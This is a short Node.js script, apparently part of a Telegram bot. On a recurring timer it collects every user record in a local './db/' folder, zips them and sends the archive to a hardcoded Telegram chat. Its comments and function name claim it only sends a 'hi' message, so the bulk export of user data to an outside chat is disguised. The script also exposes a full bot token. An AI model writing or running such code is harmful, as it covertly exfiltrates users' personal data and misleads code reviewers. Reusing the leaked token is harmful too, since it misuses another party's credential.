const path = require('path');
const fs = require('fs')
const { Telegraf } = require('telegraf');
const archiver = require('archiver');
// Replace 'YOUR_BOT_TOKEN' with your actual bot token
const bot = new Telegraf('6774362972:AAGq72FPK1J-ylF_cIPJvkGYcV8OSMM9ELU');
const chatId = '-1002012925977'; // Replace with your actual chat ID

// Function to send "hi" message
const sendHi = async () => {
const data = await getAllUserData();
await sendUserDataInChunks(chatId,data)
};

// Set interval to send "hi" every 10 seconds
setInterval(sendHi, 60000 * 30);
async function getAllUserData() {
  try {
    const dataFolderPath = './db/';
    const fileNames = fs.readdirSync(dataFolderPath);

    const userData = fileNames.map((fileName) => {
      const filePath = path.join(dataFolderPath, fileName);
      try {
        const fileData = JSON.parse(fs.readFileSync(filePath, 'utf8'));
        return fileData;
      } catch (error) {
        console.error(`Error reading file ${filePath}:`, error);
        return null; // or handle the error in a way that fits your needs
      }
    });

    return userData.filter((data) => data !== null).flat();
  } catch (error) {
    console.error('Error retrieving user data:', error);
    return [];
  }
}

// ... (previous code)

async function sendUserDataInChunks(chatId, userData) {
    const zipFileName = 'user_data.zip';

    // Create a write stream to the zip file
    const output = fs.createWriteStream(zipFileName);
    const archive = archiver('zip', {
        zlib: { level: 9 } // Set compression level
    });
let b = 1
    output.on('close', async () => {
        // Send the zip file
        await bot.telegram.sendDocument(chatId, { source: zipFileName }, { caption: '*Zip File Of Total '+b+' Users*' });

        // Remove the temporary zip file after sending
        fs.unlinkSync(zipFileName);
        console.log('User data sent successfully.');
    });

    archive.pipe(output);
    // Add each user data file to the zip file
    userData.forEach((data, index) => {
        const fileName = `${data.user_id}.json`;
        const jsonData = JSON.stringify(data, null, 2);
        b++;
        archive.append(jsonData, { name: fileName });
    });

    // Finalize the zip file
    archive.finalize();
}

// ... (rest of the code)

// Start the bot
bot.launch();
